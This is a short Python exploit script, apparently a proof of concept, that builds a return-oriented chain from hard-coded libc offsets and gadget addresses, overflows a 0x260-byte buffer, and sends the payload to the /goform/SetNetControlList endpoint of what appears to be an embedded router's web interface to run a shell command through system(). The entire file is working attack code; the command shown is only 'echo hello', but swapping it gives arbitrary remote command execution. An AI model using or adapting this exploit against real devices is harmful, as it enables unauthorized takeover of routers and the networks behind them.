import requests
from pwn import *

cmd="echo hello"

'''
qemu-user
'''
libc_base = 0xf659c000

'''
qemu-system
libc_base = 0x76dab000
dosystemcmd = 0x76f930f0
'''

system = libc_base + 0x5A270
readable_addr = libc_base + 0x64144
mov_r0_ret_r3 = libc_base + 0x40cb8
pop_r3 = libc_base + 0x18298

payload = 'a'*0x260
payload+= p32(pop_r3) + p32(system) + p32(mov_r0_ret_r3) + cmd


url = "http://192.168.198.140/goform/SetNetControlList"
cookie = {"Cookie":"password=12345"}
data = {"list": payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)